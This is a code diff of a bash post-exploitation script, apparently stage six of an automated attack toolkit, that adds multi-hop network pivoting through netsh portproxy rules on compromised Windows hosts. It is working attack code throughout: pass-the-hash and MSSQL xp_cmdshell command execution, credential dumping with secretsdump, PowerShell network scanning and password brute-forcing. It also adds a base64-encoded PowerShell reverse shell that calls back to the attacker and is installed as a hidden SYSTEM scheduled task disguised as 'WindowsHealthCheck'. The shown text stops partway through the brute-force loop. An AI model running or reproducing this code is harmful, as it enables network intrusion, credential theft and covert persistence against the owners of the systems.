@@ -1,21 +1,10 @@
 #!/usr/bin/env bash
 
-# 06_pivot — Lateral Movement, Network Discovery, and Cross-Segment Pivoting
-
-# This script performs cyclical lateral movement with real cross-network
-# pivoting using netsh portproxy on dual-homed compromised hosts:
-
-#   1. Check all compromised hosts for additional network interfaces
-#   2. Pass-the-Hash using NTLM hashes from 04_hashdump
-#   3. When PtH succeeds: hashdump, check for new NICs, pivot recursively
-#   4. MSSQL credential reuse against remaining MSSQL listeners
-#   5. When a new network segment is discovered:
-#      a. Use the dual-homed host to scan the new segment (PowerShell)
-#      b. Set up netsh portproxy rules on the pivot host to relay traffic
-#      c. Run the full attack chain through the forwarded ports
-#      d. Track all portproxy rules for cleanup
-#   6. Repeat until no new hosts can be compromised
-
+# 06_pivot — Lateral Movement, Network Discovery, and Multi-Hop Cross-Segment Pivoting
+#
+# Supports UNLIMITED pivot depth: Kali → Host A → Host B → Host C → ...
+# Each hop is tracked in PROXY_CHAIN_MAP and portproxy rules are chained
+# through every intermediate host automatically.
 
 OUTDIR="./recon"
 CREDS_FILE="$OUTDIR/hosts/mssql-creds.txt"
@@ -34,22 +23,13 @@ fi
 
 LPORT="${1:-4444}"
 
-
 # CONFIGURABLE
-
 TASK_NAME="WindowsHealthCheck"
-# Base port for portproxy forwarding. Each forwarded service gets the next
-# available port starting from here. Change if this range conflicts.
 PROXY_BASE_PORT=33000
 
-
-# Wordlists for brute-forcing new segments (same as 02_bruteforce)
-
-# CONFIGURABLE WORDLISTS — Same as in 02_bruteforce.
-
+# CONFIGURABLE WORDLISTS
 USERS_FILE="/usr/share/wordlists/metasploit/common_users.txt"
 PASS_FILE="/usr/share/wordlists/metasploit/common_passwords.txt"
-
 
 if [[ ! -f "$CREDS_FILE" ]]; then
     echo "[-] $CREDS_FILE not found. Run 02_bruteforce first."
@@ -60,13 +40,11 @@ if [[ ! -d "$LOOT_DIR" ]]; then
     exit 1
 fi
 
-# Track all compromised IPs globally (de-dups across cycles)
 declare -A COMPROMISED_MAP
 while IFS=: read -r IP _; do
     COMPROMISED_MAP["$IP"]=1
 done < "$CREDS_FILE"
 
-# Track known network segments so we don't rescan the same one
 declare -A KNOWN_NETWORKS
 if [[ -f "$OUTDIR/scope.txt" ]]; then
     while read -r NET; do
@@ -74,58 +52,64 @@ if [[ -f "$OUTDIR/scope.txt" ]]; then
     done < "$OUTDIR/scope.txt"
 fi
 
-# Track all networks discovered during pivoting
 NETWORKS_FILE="$PIVOT_DIR/networks-discovered.txt"
 > "$NETWORKS_FILE"
 
-# Track all portproxy rules for cleanup
-# Format: PIVOT_IP:LISTEN_PORT:REMOTE_IP:REMOTE_PORT:ACCESS_METHOD:ACCESS_CRED
 PORTPROXY_FILE="$PIVOT_DIR/portproxy-rules.txt"
 > "$PORTPROXY_FILE"
 
-# Track pivot decisions for the report generator
 > "$PIVOT_DIR/pivot-decisions.txt"
 
-# Global proxy port counter
 NEXT_PROXY_PORT=$PROXY_BASE_PORT
+
+# PROXY CHAIN MAP — tracks how Kali reaches each compromised host
+# "DIRECT" = same segment     "IP:PORT" = connect to this proxy endpoint
+declare -A PROXY_CHAIN_MAP
+while IFS=: read -r IP _; do
+    PROXY_CHAIN_MAP["$IP"]="DIRECT"
+done < "$CREDS_FILE"
 
 is_compromised() {
     [[ "${COMPROMISED_MAP[$1]+exists}" ]]
 }
 
-
-# Helper: Execute a command on a host via the best available method
-# Tries MSSQL xp_cmdshell first, falls back to PtH via nxc
-
+# Proxy-chain-aware remote command execution
 remote_exec() {
     local HOST="$1"
     local CMD="$2"
+    local CHAIN="${PROXY_CHAIN_MAP[$HOST]:-DIRECT}"
 
-    # Check if we have MSSQL creds for this host
     local MSSQL_LINE
     MSSQL_LINE=$(grep "^${HOST}:" "$CREDS_FILE" 2>/dev/null | head -1)
-
     if [[ -n "$MSSQL_LINE" ]]; then
         local PORT USER PASS
         PORT=$(echo "$MSSQL_LINE" | cut -d: -f2)
         USER=$(echo "$MSSQL_LINE" | cut -d: -f3)
         PASS=$(echo "$MSSQL_LINE" | cut -d: -f4)
-        # Escape single quotes for SQL: ' becomes ''
         local ESCAPED_CMD="${CMD//\'/\'\'}"
-        printf "exec master..xp_cmdshell '%s';\nexit\n" "$ESCAPED_CMD" | \
-            mssqlclient "${USER}:${PASS}@${HOST}" -port "$PORT" 2>&1
+        if [[ "$CHAIN" == "DIRECT" ]]; then
+            printf "exec master..xp_cmdshell '%s';\nexit\n" "$ESCAPED_CMD" | \
+                mssqlclient "${USER}:${PASS}@${HOST}" -port "$PORT" 2>&1
+        else
+            local PXY_IP="${CHAIN%%:*}" PXY_PORT="${CHAIN##*:}"
+            printf "exec master..xp_cmdshell '%s';\nexit\n" "$ESCAPED_CMD" | \
+                mssqlclient "${USER}:${PASS}@${PXY_IP}" -port "$PXY_PORT" 2>&1
+        fi
         return
     fi
 
-    # Check if we have PtH creds for this host
     local PTH_LINE
     PTH_LINE=$(grep "^${HOST}:" "$PIVOT_DIR/pth-successes.txt" 2>/dev/null | head -1)
-
     if [[ -n "$PTH_LINE" ]]; then
         local PUSER NTHASH
         PUSER=$(echo "$PTH_LINE" | cut -d: -f2)
         NTHASH=$(echo "$PTH_LINE" | cut -d: -f3)
-        nxc smb "$HOST" -u "$PUSER" -H "$NTHASH" -x "$CMD" 2>&1
+        if [[ "$CHAIN" == "DIRECT" ]]; then
+            nxc smb "$HOST" -u "$PUSER" -H "$NTHASH" -x "$CMD" 2>&1
+        else
+            local PXY_IP="${CHAIN%%:*}" PXY_PORT="${CHAIN##*:}"
+            nxc smb "$PXY_IP" --port "$PXY_PORT" -u "$PUSER" -H "$NTHASH" -x "$CMD" 2>&1
+        fi
         return
     fi
 
@@ -133,26 +117,29 @@ remote_exec() {
     return 1
 }
 
-
-# Function: Run hashdump against a host we have admin access to via PtH
-
+# Proxy-chain-aware hashdump
 pivot_hashdump() {
     local HOST="$1"
     local NTHASH="$2"
     local PUSER="${3:-Administrator}"
-
     echo "[*]   Running credential dump on $HOST..."
-
     local SAFE_HOST="${HOST//./_}"
     local LOOT_SUBDIR="$LOOT_DIR/${SAFE_HOST}"
     mkdir -p "$LOOT_SUBDIR"
-
     local HASH_FILE="$LOOT_SUBDIR/hashes.txt"
+    local CHAIN="${PROXY_CHAIN_MAP[$HOST]:-DIRECT}"
 
-    secretsdump.py -hashes "aad3b435b51404eeaad3b435b51404ee:${NTHASH}" \
-        "${PUSER}@${HOST}" 2>&1 | \
-	grep -v "Exception ignored\|Traceback\|File \"/home\|KeyError\|winregistry\|secretsdump\|smbconnection\|smb3\|crypto\|Cryptodome\|ERROR_DEPENDENT" | \
-	tee "$HASH_FILE"
+    if [[ "$CHAIN" == "DIRECT" ]]; then
+        secretsdump.py -hashes "aad3b435b51404eeaad3b435b51404ee:${NTHASH}" \
+            "${PUSER}@${HOST}" 2>&1
+    else
+        local PXY_IP="${CHAIN%%:*}" PXY_PORT="${CHAIN##*:}"
+        timeout 60 secretsdump.py -hashes "aad3b435b51404eeaad3b435b51404ee:${NTHASH}" \
+            -target-ip "${PXY_IP}" -port "$PXY_PORT" \
+            "${PUSER}@${PXY_IP}" 2>&1
+    fi | \
+        grep -v "Exception ignored\|Traceback\|File \"/home\|KeyError\|winregistry\|secretsdump\|smbconnection\|smb3\|crypto\|Cryptodome\|ERROR_DEPENDENT" | \
+        tee "$HASH_FILE"
 
     if grep -q ":::" "$HASH_FILE" 2>/dev/null; then
         echo "[+]   Hashes extracted and saved to $HASH_FILE"
@@ -161,14 +148,8 @@ pivot_hashdump() {
     fi
 }
 
-
-# Function: Parse ipconfig output and return new CIDR ranges + the
-#           interface IP on the pivot host that reaches each new network
-# Output format (one per line): CIDR|PIVOT_IFACE_IP
-
 parse_networks_from_ipconfig() {
     local IPCONFIG_OUTPUT="$1"
-
     local CURRENT_IP=""
     while IFS= read -r LINE; do
         if echo "$LINE" | grep -qiP 'IPv4 Address'; then
@@ -197,20 +178,12 @@ parse_networks_from_ipconfig() {
                 IFS='.' read -ra MASK_PARTS <<< "$MASK"
                 local NET_ADDR="$((${IP_PARTS[0]} & ${MASK_PARTS[0]})).$((${IP_PARTS[1]} & ${MASK_PARTS[1]})).$((${IP_PARTS[2]} & ${MASK_PARTS[2]})).$((${IP_PARTS[3]} & ${MASK_PARTS[3]}))"
                 local CIDR_RANGE="${NET_ADDR}/${CIDR_BITS}"
-
-                # Skip loopback, link-local, APIPA
                 if [[ "$CURRENT_IP" == 127.* || "$CURRENT_IP" == 169.254.* ]]; then
-                    CURRENT_IP=""
-                    continue
+                    CURRENT_IP=""; continue
                 fi
-
-                # Skip invalid CIDR (bad mask parse = /0, host route = /32)
                 if [[ $CIDR_BITS -le 0 || $CIDR_BITS -ge 32 ]]; then
-                    CURRENT_IP=""
-                    continue
+                    CURRENT_IP=""; continue
                 fi
-
-                # Check if this network is new
                 if [[ -z "${KNOWN_NETWORKS[$CIDR_RANGE]+exists}" ]]; then
                     echo "${CIDR_RANGE}|${CURRENT_IP}"
                     KNOWN_NETWORKS["$CIDR_RANGE"]=1
@@ -221,221 +194,245 @@ parse_networks_from_ipconfig() {
     done <<< "$IPCONFIG_OUTPUT"
 }
 
-
-# Function: Discover new networks on a compromised host
-# Returns: CIDR|PIVOT_IFACE_IP lines for each new network found
-
-discover_networks() {
-    local HOST="$1"
-    local METHOD="$2"   # "mssql" or "pth"
-    local CRED1="$3"    # PORT (mssql) or NTHASH (pth)
-    local CRED2="$4"    # USER (mssql) or PUSER (pth)
-    local CRED3="$5"    # PASS (mssql only)
-
-    echo "[*]   Checking $HOST for additional network interfaces..."
-
-    local IPCONFIG_OUTPUT
-    if [[ "$METHOD" == "mssql" ]]; then
-        IPCONFIG_OUTPUT=$(printf "exec master..xp_cmdshell 'ipconfig /all';\nexit\n" | \
-            mssqlclient "${CRED2}:${CRED3}@${HOST}" -port "$CRED1" 2>&1)
-    else
-        IPCONFIG_OUTPUT=$(nxc smb "$HOST" -u "$CRED2" -H "$CRED1" \
-            -x "ipconfig /all" 2>&1)
-    fi
-
-    local NEW_FOUND=0
-    while IFS='|' read -r CIDR_RANGE PIVOT_IFACE_IP; do
-        [[ -z "$CIDR_RANGE" ]] && continue
-        echo "[+]   NEW network segment found: $CIDR_RANGE (via $PIVOT_IFACE_IP on $HOST)"
-        echo "$CIDR_RANGE" >> "$NETWORKS_FILE"
-        echo "$CIDR_RANGE" >> "$OUTDIR/scope.txt"
-        NEW_FOUND=1
-    done < <(parse_networks_from_ipconfig "$IPCONFIG_OUTPUT")
-
-    return $((1 - NEW_FOUND))
-}
-
-
-# Function: Set up a portproxy rule on a pivot host
-# Creates: netsh interface portproxy add v4tov4 on the pivot host
-# Records the rule in portproxy-rules.txt for cleanup
-# Returns: the local listen port that was assigned
-
-setup_portproxy() {
-    local PIVOT_HOST="$1"     # The dual-homed host we control
-    local PIVOT_LISTEN_IP="$2" # The IP on the pivot host WE can reach
-    local REMOTE_IP="$3"      # The target on the new segment
-    local REMOTE_PORT="$4"    # The port on the remote target
-
-    local LISTEN_PORT=$NEXT_PROXY_PORT
-    NEXT_PROXY_PORT=$((NEXT_PROXY_PORT + 1))
-
-    # Status message to stderr so it doesn't pollute the captured port number
-    echo "[*]     Setting up portproxy: ${PIVOT_HOST}:${LISTEN_PORT} -> ${REMOTE_IP}:${REMOTE_PORT}" >&2
-
-    remote_exec "$PIVOT_HOST" \
-        "netsh interface portproxy add v4tov4 listenport=${LISTEN_PORT} listenaddress=${PIVOT_LISTEN_IP} connectport=${REMOTE_PORT} connectaddress=${REMOTE_IP}" \
-        > /dev/null 2>&1
-
-    # Record for cleanup
-    echo "${PIVOT_HOST}|${PIVOT_LISTEN_IP}|${LISTEN_PORT}|${REMOTE_IP}|${REMOTE_PORT}" >> "$PORTPROXY_FILE"
-
-    # Return ONLY the listen port to stdout
-    echo "$LISTEN_PORT"
-}
-
-
-# Function: Scan a new network segment FROM the pivot host using PowerShell
-# Since we can't nmap a network we don't have a route to, we run a
-# lightweight scan from the compromised host itself.
-#
-# Uses async TCP connect scanning instead of ICMP (Test-Connection) because:
-#   - Test-Connection has no timeout parameter on PowerShell 5.1
-#   - ICMP ping sweep of a /24 takes 15+ minutes with default timeouts
-#   - TCP connect with 500ms timeout finishes the full /24 in ~2 minutes
-#
-# Phase 1: TCP host discovery on port 445 (finds Windows hosts)
-# Phase 2: Port scan key services on discovered hosts
-
 remote_scan_segment() {
     local PIVOT_HOST="$1"
     local NEW_CIDR="$2"
     local RESULTS_FILE="$3"
-    local PIVOT_SEGMENT_IP="$4"  # The pivot host's IP on this segment (to skip)
-
+    local PIVOT_SEGMENT_IP="$4"
     echo "[*]   Running remote host discovery from $PIVOT_HOST on $NEW_CIDR..."
-
     local NET_BASE
     NET_BASE=$(echo "$NEW_CIDR" | cut -d/ -f1 | sed 's/\.[0-9]*$//')
-
-    # Phase 1: TCP host discovery via port 445 with 500ms timeout
-    # Skips the pivot host's own IP on this segment
     local PS_DISCOVERY="1..254 | ForEach-Object { \$ip = '${NET_BASE}.' + \$_; if (\$ip -ne '${PIVOT_SEGMENT_IP}') { \$t = New-Object System.Net.Sockets.TcpClient; \$c = \$t.BeginConnect(\$ip, 445, \$null, \$null); \$w = \$c.AsyncWaitHandle.WaitOne(500, \$false); if (\$w -and \$t.Connected) { Write-Output \$ip; \$t.Close() } else { \$t.Close() } } }"
-
     local LIVE_HOSTS
     LIVE_HOSTS=$(remote_exec "$PIVOT_HOST" "powershell.exe -Command \"${PS_DISCOVERY}\"" 2>&1 | \
         tr -d '\0' | grep -oP '[\d]+\.[\d]+\.[\d]+\.[\d]+' | sort -u)
-
     if [[ -z "$LIVE_HOSTS" ]]; then
-        echo "[-]   No live Windows hosts found on $NEW_CIDR from $PIVOT_HOST."
+        echo "[-]   No live hosts found on $NEW_CIDR from $PIVOT_HOST."
         return 1
     fi
-
     local HOST_COUNT
     HOST_COUNT=$(echo "$LIVE_HOSTS" | wc -l)
-    echo "[+]   Found $HOST_COUNT live Windows host(s) on $NEW_CIDR"
-
-    # Phase 2: Port scan each discovered host for key services
+    echo "[+]   Found $HOST_COUNT live host(s) on $NEW_CIDR"
     echo "[*]   Scanning key ports on discovered hosts..."
     local SCAN_PORTS="445,1433,3389,139,135,80,443,8080"
-
     > "$RESULTS_FILE"
-
     while read -r REMOTE_HOST; do
         [[ -z "$REMOTE_HOST" ]] && continue
-
         is_compromised "$REMOTE_HOST" && continue
-
         local PS_PORTSCAN="\$ports = @(${SCAN_PORTS}); foreach (\$p in \$ports) { try { \$t = New-Object System.Net.Sockets.TcpClient; \$c = \$t.BeginConnect('${REMOTE_HOST}', \$p, \$null, \$null); \$w = \$c.AsyncWaitHandle.WaitOne(500, \$false); if (\$w -and \$t.Connected) { Write-Output ('${REMOTE_HOST}:' + \$p + ':open'); \$t.Close() } else { \$t.Close() } } catch {} }"
-
         local SCAN_RESULT
         SCAN_RESULT=$(remote_exec "$PIVOT_HOST" "powershell.exe -Command \"${PS_PORTSCAN}\"" 2>&1 | \
             tr -d '\0' | grep ":open" | grep -oP '[\d]+\.[\d]+\.[\d]+\.[\d]+:\d+')
-
         while read -r HOSTPORT; do
             [[ -z "$HOSTPORT" ]] && continue
             echo "$HOSTPORT" >> "$RESULTS_FILE"
             echo "[+]     $HOSTPORT open"
         done <<< "$SCAN_RESULT"
-
     done <<< "$LIVE_HOSTS"
-
     if [[ ! -s "$RESULTS_FILE" ]]; then
         echo "[-]   No open ports found on new segment hosts."
         return 1
     fi
-
     return 0
 }
 
+# Chained portproxy — handles unlimited hop depth
+# Returns: IP:PORT that Kali connects to
+setup_chained_portproxy() {
+    local PIVOT_HOST="$1"
+    local PIVOT_LISTEN_IP="$2"
+    local REMOTE_IP="$3"
+    local REMOTE_PORT="$4"
+    local PIVOT_CHAIN="${PROXY_CHAIN_MAP[$PIVOT_HOST]:-DIRECT}"
 
-# Function: Attack a new network segment through a pivot host
-# This is the real cross-network pivot implementation:
-#   1. Remote scan from pivot host (PowerShell)
-#   2. Set up portproxy rules for discovered services
-#   3. Attack through the forwarded ports from our attacker box
+    if [[ "$PIVOT_CHAIN" == "DIRECT" ]]; then
+        local LISTEN_PORT=$NEXT_PROXY_PORT
+        NEXT_PROXY_PORT=$((NEXT_PROXY_PORT + 1))
+        echo "[*]     Portproxy on $PIVOT_HOST: :${LISTEN_PORT} -> ${REMOTE_IP}:${REMOTE_PORT}"
+        remote_exec "$PIVOT_HOST" \
+            "netsh interface portproxy add v4tov4 listenport=${LISTEN_PORT} listenaddress=${PIVOT_LISTEN_IP} connectport=${REMOTE_PORT} connectaddress=${REMOTE_IP}" \
+            > /dev/null 2>&1
+        echo "${PIVOT_HOST}|${PIVOT_LISTEN_IP}|${LISTEN_PORT}|${REMOTE_IP}|${REMOTE_PORT}" >> "$PORTPROXY_FILE"
+        echo "${PIVOT_LISTEN_IP}:${LISTEN_PORT}"
+    else
+        # Multi-hop: create rule on pivot host, then chain through first-hop
+        local PIVOT_NEW_PORT=$NEXT_PROXY_PORT
+        NEXT_PROXY_PORT=$((NEXT_PROXY_PORT + 1))
+        echo "[*]     Portproxy on $PIVOT_HOST (deep hop): :${PIVOT_NEW_PORT} -> ${REMOTE_IP}:${REMOTE_PORT}"
+        remote_exec "$PIVOT_HOST" \
+            "netsh interface portproxy add v4tov4 listenport=${PIVOT_NEW_PORT} listenaddress=${PIVOT_LISTEN_IP} connectport=${REMOTE_PORT} connectaddress=${REMOTE_IP}" \
+            > /dev/null 2>&1
+        echo "${PIVOT_HOST}|${PIVOT_LISTEN_IP}|${PIVOT_NEW_PORT}|${REMOTE_IP}|${REMOTE_PORT}" >> "$PORTPROXY_FILE"
 
+        local FIRST_HOP_IP="${PIVOT_CHAIN%%:*}"
+        local FIRST_HOP_PORT=$NEXT_PROXY_PORT
+        NEXT_PROXY_PORT=$((NEXT_PROXY_PORT + 1))
+        echo "[*]     Portproxy on $FIRST_HOP_IP (chain hop): :${FIRST_HOP_PORT} -> ${PIVOT_LISTEN_IP}:${PIVOT_NEW_PORT}"
+        remote_exec "$FIRST_HOP_IP" \
+            "netsh interface portproxy add v4tov4 listenport=${FIRST_HOP_PORT} listenaddress=${FIRST_HOP_IP} connectport=${PIVOT_NEW_PORT} connectaddress=${PIVOT_LISTEN_IP}" \
+            > /dev/null 2>&1
+        echo "${FIRST_HOP_IP}|${FIRST_HOP_IP}|${FIRST_HOP_PORT}|${PIVOT_LISTEN_IP}|${PIVOT_NEW_PORT}" >> "$PORTPROXY_FILE"
+        echo "${FIRST_HOP_IP}:${FIRST_HOP_PORT}"
+    fi
+}
+
+# Function: Run the full post-exploitation chain on a remote host via proxy
+# This replicates what 03_xpcmdshell, 04_hashdump, and 05_persist do
+# but through the proxy chain. Called after any remote host is compromised.
+#
+# For hashdump: uses secretsdump through the proxy (can't do the SMB share
+# trick since smbclient can't reach the remote host directly).
+# For persistence: builds the payload and runs schtasks through xp_cmdshell
+# via proxy, or through nxc PtH via proxy.
+
+remote_post_exploit() {
+    local REMOTE_IP="$1"
+    local ACCESS_METHOD="$2"   # "mssql" or "pth"
+    local KALI_IP="$3"         # IP Kali connects to
+    local KALI_PORT="$4"       # Port Kali connects to
+    local CRED1="$5"           # USER (mssql) or NTHASH (pth)
+    local CRED2="$6"           # PASS (mssql) or PUSER (pth)
+
+    local SAFE_REMOTE="${REMOTE_IP//./_}"
+
+    # --- HASHDUMP via secretsdump through proxy ---
+    echo "[*]   [Post-Exploit] Running credential dump on $REMOTE_IP via proxy..."
+    local REMOTE_LOOT="$LOOT_DIR/${SAFE_REMOTE}"
+    mkdir -p "$REMOTE_LOOT"
+
+    if [[ "$ACCESS_METHOD" == "pth" ]]; then
+        timeout 60 secretsdump.py -hashes "aad3b435b51404eeaad3b435b51404ee:${CRED1}" \
+            -target-ip "${KALI_IP}" -port "$KALI_PORT" \
+            "${CRED2}@${KALI_IP}" 2>&1 | \
+            grep -v "Exception ignored\|Traceback\|File \"/home\|KeyError\|winregistry\|secretsdump\|smbconnection\|smb3\|crypto\|Cryptodome\|ERROR_DEPENDENT" | \
+            tee "$REMOTE_LOOT/hashes.txt"
+    else
+        # For MSSQL-compromised hosts, we need to do hashdump through xp_cmdshell
+        # Save hives, then use reg save approach through the proxy
+        echo "[*]   Saving SAM/SYSTEM hives on $REMOTE_IP..."
+        printf "exec master..xp_cmdshell 'reg save HKLM\\SAM C:\\Windows\\Temp\\sam /y';\nexec master..xp_cmdshell 'reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys /y';\nexit\n" | \
+            mssqlclient "${CRED1}:${CRED2}@${KALI_IP}" -port "$KALI_PORT" 2>&1 > /dev/null
+
+        # Use secretsdump locally if we can get the hives, otherwise try remote
+        # For proxy chains, remote secretsdump via MSSQL service account may not work
+        # Try it anyway — worst case it fails gracefully
+        echo "[*]   Attempting remote secretsdump on $REMOTE_IP via proxy..."
+        timeout 60 secretsdump.py "${CRED1}:${CRED2}@${KALI_IP}" -port "$KALI_PORT" 2>&1 | \
+            grep -v "Exception ignored\|Traceback\|File \"/home\|KeyError\|winregistry\|secretsdump\|smbconnection\|smb3\|crypto\|Cryptodome\|ERROR_DEPENDENT" | \
+            tee "$REMOTE_LOOT/hashes.txt"
+    fi
+
+    if grep -q ":::" "$REMOTE_LOOT/hashes.txt" 2>/dev/null; then
+        echo "[+]   Hashes extracted from $REMOTE_IP"
+    else
+        echo "[-]   No hashes extracted from $REMOTE_IP (may need manual extraction)"
+    fi
+
+    # --- PERSISTENCE via scheduled task through proxy ---
+    echo "[*]   [Post-Exploit] Establishing persistence on $REMOTE_IP..."
+
+    local PS_PAYLOAD="\$c=New-Object System.Net.Sockets.TCPClient(\\\"${LHOST}\\\",${LPORT});\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){;\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1|Out-String);\$t=(New-Object -TypeName System.Text.ASCIIEncoding).GetBytes(\$r);\$s.Write(\$t,0,\$t.Length);\$s.Flush()};\$c.Close()"
+    local B64_PAYLOAD
+    B64_PAYLOAD=$(echo -n "$PS_PAYLOAD" | base64 -w0)
+
+    local PAYLOAD_PATH="C:\\Windows\\Temp\\healthcheck.ps1"
+    local PERSIST_LOG="$PERSIST_DIR/${SAFE_REMOTE}_persist.txt"
+    mkdir -p "$PERSIST_DIR"
+
+    if [[ "$ACCESS_METHOD" == "mssql" ]]; then
+        # Write payload via xp_cmdshell through proxy
+        printf "exec master..xp_cmdshell 'powershell.exe -Command \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(''${B64_PAYLOAD}'')) | Set-Content ''${PAYLOAD_PATH}''\"';\nexit\n" | \
+            mssqlclient "${CRED1}:${CRED2}@${KALI_IP}" -port "$KALI_PORT" 2>&1 > /dev/null
+
+        # Create scheduled task
+        printf "exec master..xp_cmdshell 'schtasks /create /tn ${TASK_NAME} /tr \"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ${PAYLOAD_PATH}\" /sc onstart /ru SYSTEM /f';\nexit\n" | \
+            mssqlclient "${CRED1}:${CRED2}@${KALI_IP}" -port "$KALI_PORT" 2>&1 | \
+            tee -a "$PERSIST_LOG"
+
+        # Verify
+        local TASK_CHECK
+        TASK_CHECK=$(printf "exec master..xp_cmdshell 'schtasks /query /tn ${TASK_NAME}';\nexit\n" | \
+            mssqlclient "${CRED1}:${CRED2}@${KALI_IP}" -port "$KALI_PORT" 2>&1)
+    else
+        # Write payload via nxc PtH through proxy
+        nxc smb "${KALI_IP}" --port "$KALI_PORT" -u "$CRED2" -H "$CRED1" \
+            -x "powershell.exe -Command \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${B64_PAYLOAD}')) | Set-Content '${PAYLOAD_PATH}'\"" 2>&1 > /dev/null
+
+        # Create scheduled task
+        nxc smb "${KALI_IP}" --port "$KALI_PORT" -u "$CRED2" -H "$CRED1" \
+            -x "schtasks /create /tn ${TASK_NAME} /tr \"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ${PAYLOAD_PATH}\" /sc onstart /ru SYSTEM /f" 2>&1 | \
+            tee -a "$PERSIST_LOG"
+
+        # Verify
+        local TASK_CHECK
+        TASK_CHECK=$(nxc smb "${KALI_IP}" --port "$KALI_PORT" -u "$CRED2" -H "$CRED1" \
+            -x "schtasks /query /tn ${TASK_NAME}" 2>&1)
+    fi
+
+    if echo "$TASK_CHECK" | grep -qi "$TASK_NAME"; then
+        echo "[+]   Persistence established on $REMOTE_IP (task: $TASK_NAME)"
+        cat >> "$PERSIST_LOG" <<PERSIST_EOF
+
+--- Persistence Summary ---
+Target:         $REMOTE_IP (via proxy ${KALI_IP}:${KALI_PORT})
+Method:         Scheduled Task (onstart)
+Task Name:      $TASK_NAME
+Run As:         SYSTEM
+Payload Path:   $PAYLOAD_PATH
+Callback:       $LHOST:$LPORT
+Timestamp:      $(date -u +"%Y-%m-%dT%H:%M:%SZ")
+MITRE ATT&CK:  T1053.005
+PERSIST_EOF
+    else
+        echo "[-]   Persistence may have failed on $REMOTE_IP (could not verify task)"
+    fi
+}
+
+
+# Attack a new segment — now with recursive NIC discovery on compromised hosts
 attack_new_segment() {
-    local PIVOT_HOST="$1"       # The dual-homed host we control
-    local PIVOT_REACHABLE_IP="$2" # The IP on pivot host WE can reach
-    local NEW_CIDR="$3"         # The new network segment
-    local PIVOT_SEGMENT_IP="$4" # The pivot host's IP on the new segment (to skip in scans)
-
+    local PIVOT_HOST="$1"
+    local PIVOT_REACHABLE_IP="$2"
+    local NEW_CIDR="$3"
+    local PIVOT_SEGMENT_IP="$4"
+    local PIVOT_CHAIN="${PROXY_CHAIN_MAP[$PIVOT_HOST]:-DIRECT}"
     echo ""
     echo "[*] CROSS-NETWORK PIVOT via $PIVOT_HOST"
     echo "[*] Target segment: $NEW_CIDR"
-    echo "[*] Method: netsh portproxy on $PIVOT_HOST"
+    [[ "$PIVOT_CHAIN" != "DIRECT" ]] && echo "[*] Multi-hop chain: $PIVOT_CHAIN"
     echo ""
 
-    # Phase 1: Remote scan from the pivot host
     local SCAN_RESULTS="$PIVOT_DIR/remote-scan_${NEW_CIDR//[\/.]/_}.txt"
     if ! remote_scan_segment "$PIVOT_HOST" "$NEW_CIDR" "$SCAN_RESULTS" "$PIVOT_SEGMENT_IP"; then
         echo "[-] Remote scan found nothing. Skipping segment."
         return
     fi
 
-    # Phase 2: Set up portproxy rules for each discovered service
     echo ""
-    echo "[*] Setting up portproxy forwarding rules on $PIVOT_HOST..."
-
-    # Track what we've forwarded so we can attack through it
-    # Format: REMOTE_IP:REMOTE_PORT:PROXY_PORT
+    echo "[*] Setting up portproxy forwarding rules..."
     local FORWARD_MAP="$PIVOT_DIR/forward-map_${NEW_CIDR//[\/.]/_}.txt"
     > "$FORWARD_MAP"
 
     while IFS=: read -r REMOTE_IP REMOTE_PORT; do
         [[ -z "$REMOTE_IP" || -z "$REMOTE_PORT" ]] && continue
-
-        # setup_portproxy echoes the port to stdout, but running in $()
-        # would lose the NEXT_PROXY_PORT increment (subshell). Instead,
-        # assign the port directly and call setup_portproxy inline.
-        local LISTEN_PORT=$NEXT_PROXY_PORT
-        NEXT_PROXY_PORT=$((NEXT_PROXY_PORT + 1))
-
-        echo "[*]     Setting up portproxy: ${PIVOT_HOST}:${LISTEN_PORT} -> ${REMOTE_IP}:${REMOTE_PORT}"
-
-        remote_exec "$PIVOT_HOST" \
-            "netsh interface portproxy add v4tov4 listenport=${LISTEN_PORT} listenaddress=${PIVOT_REACHABLE_IP} connectport=${REMOTE_PORT} connectaddress=${REMOTE_IP}" \
-            > /dev/null 2>&1
-
-        # Record for cleanup
-        echo "${PIVOT_HOST}|${PIVOT_REACHABLE_IP}|${LISTEN_PORT}|${REMOTE_IP}|${REMOTE_PORT}" >> "$PORTPROXY_FILE"
-
-        echo "${REMOTE_IP}:${REMOTE_PORT}:${LISTEN_PORT}" >> "$FORWARD_MAP"
+        local KALI_ENDPOINT
+        KALI_ENDPOINT=$(setup_chained_portproxy "$PIVOT_HOST" "$PIVOT_REACHABLE_IP" "$REMOTE_IP" "$REMOTE_PORT")
+        local K_IP="${KALI_ENDPOINT%%:*}" K_PORT="${KALI_ENDPOINT##*:}"
+        echo "${REMOTE_IP}:${REMOTE_PORT}:${K_IP}:${K_PORT}" >> "$FORWARD_MAP"
     done < "$SCAN_RESULTS"
 
-    # Allow portproxy rules to take effect
     sleep 2
-
-    echo "[+] Port forwarding established. Verifying..."
-    remote_exec "$PIVOT_HOST" "netsh interface portproxy show all" 2>&1 | \
-        grep -v "^$\|Impacket\|Press\|\[!\]\|ENVCHANGE" | head -20
-    echo ""
-
-    # Phase 3: Attack through forwarded ports
+    echo "[+] Port forwarding established."
     echo ""
     echo "[*] Attacking through forwarded ports..."
-    echo "[*] NOTE: Cross-network attacks are slower due to port forwarding."
     echo ""
 
-    while IFS=: read -r REMOTE_IP REMOTE_PORT PROXY_PORT; do
-        [[ -z "$PROXY_PORT" ]] && continue
+    while IFS=: read -r REMOTE_IP REMOTE_PORT KALI_IP KALI_PORT; do
+        [[ -z "$KALI_PORT" ]] && continue
 
         if [[ "$REMOTE_PORT" == "1433" ]]; then
-            echo "[*] Trying MSSQL brute-force on $REMOTE_IP:$REMOTE_PORT via ${PIVOT_REACHABLE_IP}:${PROXY_PORT}..."
-            local FOUND=0
-            local ATTEMPT=0
-
+            echo "[*] Trying MSSQL brute-force on $REMOTE_IP via ${KALI_IP}:${KALI_PORT}..."
+            local FOUND=0 ATTEMPT=0
             while read -r USER; do
